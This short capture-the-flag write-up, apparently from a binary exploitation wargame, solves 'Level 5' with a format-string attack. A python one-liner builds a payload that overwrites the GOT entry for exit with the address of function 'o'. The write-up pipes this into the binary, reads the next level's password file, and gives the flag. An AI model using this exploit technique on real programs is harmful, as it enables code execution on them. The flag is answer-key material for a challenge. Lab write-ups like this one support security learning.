# Level 5

This time we need to overflow in GOT to override 'exit' function address with the address of the function 'o'.

```bash
python -c 'print "\x38\x98\x04\x08% 134513824x%4$n"' > /tmp/level5
cat /tmp/level5 - | ./level5
cat /home/user/level6/.pass
```

**Flag:** `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
